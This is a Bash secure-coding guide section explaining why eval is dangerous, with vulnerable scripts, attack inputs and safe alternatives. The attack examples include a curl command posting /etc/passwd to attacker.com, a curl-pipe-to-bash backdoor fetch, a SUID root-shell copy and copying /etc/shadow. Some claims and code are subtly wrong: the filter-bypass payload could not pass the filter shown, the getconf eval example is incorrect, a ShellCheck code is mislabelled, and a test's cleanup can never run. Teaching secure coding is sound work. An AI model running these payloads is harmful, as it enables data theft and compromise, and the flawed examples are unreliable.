### Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if input is attacker-controlled
- **No Sandboxing**: `eval` runs with full script privileges, including file access, network operations, and command execution
- **Bypasses All Validation**: Even sanitized input can contain metacharacters that enable injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting and escaping requirements are complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has a safer alternative using arrays, indirect expansion, or proper data structures

**Understanding eval:**

`eval` takes a string, performs all expansions on it, then executes the result as a command.

\`\`\`bash
# Basic eval behavior
cmd='echo "Hello World"'
eval "$cmd"  # Executes: echo "Hello World"
# Output: Hello World

# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
# Output: username
\`\`\`

**Attack Example 1: Direct Command Injection**

\`\`\`bash
# Vulnerable script - NEVER DO THIS!
#!/bin/bash
set -euo pipefail

# Script allows user to set a variable
user_input="$1"

# Dangerous: eval executes arbitrary code
eval "$user_input"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker provides malicious input
./vulnerable-script.sh 'rm -rf /tmp/*'
# Executes: rm -rf /tmp/*

# Or worse - exfiltrate data
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'

# Or install backdoor
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'

# Or create SUID shell
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
\`\`\`

**Attack Example 2: Variable Name Injection**

\`\`\`bash
# Vulnerable script - seems safe but isn't!
#!/bin/bash
set -euo pipefail

# User provides variable name and value
var_name="$1"
var_value="$2"

# Attempt to set variable dynamically - DANGEROUS!
eval "$var_name='$var_value'"

echo "Variable $var_name has been set"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker injects command via variable name
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'

# The eval executes:
# x=$(rm -rf /important/data)='ignored'
# Which executes the command substitution!

# Or exfiltrate via variable value
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
# The eval executes:
# x='$(cat /etc/shadow > /tmp/stolen)'
# Command substitution runs with script privileges!
\`\`\`

**Attack Example 3: Escaped Character Bypass**

\`\`\`bash
# Vulnerable script - attempts sanitization
#!/bin/bash
set -euo pipefail

# User input for calculation
user_expr="$1"

# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators

# Still dangerous!
eval "result=$sanitized"
echo "Result: $result"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker uses allowed characters maliciously
./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'

# Or uses integer assignment to overwrite critical variables
./vulnerable-script.sh 'PATH=0'
# Now PATH is set to 0, breaking the script or enabling other attacks
\`\`\`

**Attack Example 4: Log Injection via eval**

\`\`\`bash
# Vulnerable logging function
log_event() {
  local -- event="$1"
  local -- timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')

  # Dangerous: eval used to expand variables in log template
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}

# Usage
user_action="$1"
log_event "$user_action"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker injects command via event parameter
./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'

# The eval executes:
# echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
# Three commands execute: echo, cat (malicious), echo
\`\`\`

**Safe Alternative 1: Use Arrays for Command Construction**

\`\`\`bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  # Build command in array - no eval needed!
  cmd=(find "$search_path" -type f -name "$file_pattern")

  # Execute array safely
  "${cmd[@]}"
}

# Usage
build_find_command '/var/data' '*.txt'

# Array preserves exact arguments, no injection possible
\`\`\`

**Safe Alternative 2: Use Indirect Expansion for Variable References**

\`\`\`bash
# ✗ Wrong - using eval for variable indirection
var_name='HOME'
eval "value=\\$$var_name"  # Gets value of $HOME
echo "$value"

# ✓ Correct - use indirect expansion
var_name='HOME'
echo "${!var_name}"  # Direct syntax, no eval needed

# ✓ Correct - for assignment, use declare/printf
var_name='MY_VAR'
value='Hello World'
printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
echo "${!var_name}"  # Access value
\`\`\`

**Safe Alternative 3: Use Associative Arrays for Dynamic Data**

\`\`\`bash
# ✗ Wrong - using eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
done

# ✓ Correct - use associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done

# Access values
echo "${data[var_3]}"  # value 3
\`\`\`

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

\`\`\`bash
# ✗ Wrong - eval to select function dynamically
action="$1"
eval "${action}_function"  # If action='malicious', dangerous!

# ✓ Correct - use case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action: $action" ;;
esac

# ✓ Also correct - use array of function names
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action: $action"
fi
\`\`\`

**Safe Alternative 5: Use Command Substitution for Output Capture**

\`\`\`bash
# ✗ Wrong - eval for command output
cmd='ls -la /tmp'
eval "output=\$($cmd)"  # Dangerous!

# ✓ Correct - direct command substitution
output=$(ls -la /tmp)

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
\`\`\`

**Safe Alternative 6: Use read for Parsing**

\`\`\`bash
# ✗ Wrong - eval for parsing key=value pairs
config_line="PORT=8080"
eval "$config_line"  # Sets PORT variable - DANGEROUS!

# ✓ Correct - use read or parameter expansion
IFS='=' read -r key value <<< "$config_line"
declare -g "$key=$value"  # Still be careful with key validation!

# ✓ Better - validate key before assignment
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
\`\`\`

**Safe Alternative 7: Use Arithmetic Expansion for Math**

\`\`\`bash
# ✗ Wrong - eval for arithmetic
user_expr="$1"
eval "result=$((user_expr))"  # Still risky!

# ✓ Correct - validate first, then use arithmetic
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi

# ✓ Better - use bc for complex math (isolates operations)
result=$(bc <<< "$user_expr")
\`\`\`

**Edge case: When eval seems necessary**

**Scenario: Dynamic variable names in loops**

\`\`\`bash
# Seems to need eval
for service in nginx apache mysql; do
  eval "${service}_status=\$(systemctl is-active $service)"
done

# ✓ Better - use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
\`\`\`

**Scenario: Sourcing configuration with variable expansion**

\`\`\`bash
# Config file contains: APP_DIR="$HOME/myapp"
# Simple sourcing doesn't expand $HOME

# Seems to need eval
while IFS= read -r line; do
  eval "$line"
done < config.txt

# ✓ Better - source directly (bash expands variables)
source config.txt

# ✓ Even better - validate config file first
if [[ -f config.txt && -r config.txt ]]; then
  # Check for dangerous patterns
  if grep -qE '(eval|exec|`|\$\()' config.txt; then
    die 1 'Config file contains dangerous patterns'
  fi
  source config.txt
else
  die 2 'Config file not found or not readable'
fi
\`\`\`

**Scenario: Building complex command with many options**

\`\`\`bash
# Seems to need eval to build command string
cmd="find /data -type f"
[[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
[[ -n "$size" ]] && cmd="$cmd -size '$size'"
eval "$cmd"  # DANGEROUS!

# ✓ Correct - use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"  # Safe execution
\`\`\`

**The rare legitimate use of eval (with extreme caution):**

\`\`\`bash
# Parsing output with known-safe format from trusted source
# Example: getconf outputs shell variable assignments
eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable

# Still better to parse manually:
ARG_MAX=$(getconf ARG_MAX)

# Another rare case: generating code from templates (development/build only)
# NEVER in production with user input!
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - eval with any user input
eval "$user_command"

# ✓ Correct - validate against whitelist
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct - use printf -v
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to source file with expansion
eval "source $config_file"

# ✓ Correct - source directly or use safe expansion
source "$config_file"

# ✗ Wrong - eval in loop
for file in *.txt; do
  eval "process_${file%.txt}"  # Trying to call function dynamically
done

# ✓ Correct - use array lookup or case statement
declare -A processors=(
  [data]=process_data
  [log]=process_log
)
for file in *.txt; do
  base="${file%.txt}"
  if [[ -v "processors[$base]" ]]; then
    "${processors[$base]}"
  fi
done

# ✗ Wrong - eval to check if variable is set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct - use -v test
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion with eval
eval "echo \$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"
\`\`\`

**Complete safe example (no eval):**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Configuration using associative array (no eval)
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch (no eval)
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
  # Start logic here
}

stop_service() {
  info "Stopping ${config[app_name]}"
  # Stop logic here
}

restart_service() {
  stop_service
  start_service
}

status_service() {
  # Check status logic here
  info "${config[app_name]} is running"
}

# Build command dynamically with array (no eval)
build_curl_command() {
  local -- url="$1"
  local -a curl_cmd=(curl)

  # Add options based on configuration
  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}")
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}")

  # Add URL
  curl_cmd+=("$url")

  # Execute safely
  "${curl_cmd[@]}"
}

main() {
  local -- action="${1:-status}"

  # Dispatch to function (no eval)
  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
\`\`\`

**Detecting eval usage:**

\`\`\`bash
# Find all eval usage in scripts
grep -rn 'eval' /path/to/scripts/

# Check if eval is used with variables (very dangerous)
grep -rn 'eval.*\$' /path/to/scripts/

# ShellCheck will warn about eval
shellcheck -x script.sh
# SC2086: eval should not be used for variable expansion
\`\`\`

**Testing for eval vulnerabilities:**

\`\`\`bash
# Test script with malicious input
test_eval_safety() {
  local -- malicious_input='$(rm -rf /tmp/test_eval_*)'

  # Create test directory
  mkdir -p /tmp/test_eval_target
  touch /tmp/test_eval_target/testfile

  # Run function with malicious input
  process_input "$malicious_input"

  # Check if malicious command executed
  if [[ ! -d /tmp/test_eval_target ]]; then
    error 'SECURITY VULNERABILITY: eval executed malicious code!'
    return 1
  else
    success 'Input properly sanitized - no eval execution'
    return 0
  fi

  # Cleanup
  rm -rf /tmp/test_eval_target
}
\`\`\`

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Audit regularly** for eval usage in codebases
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.
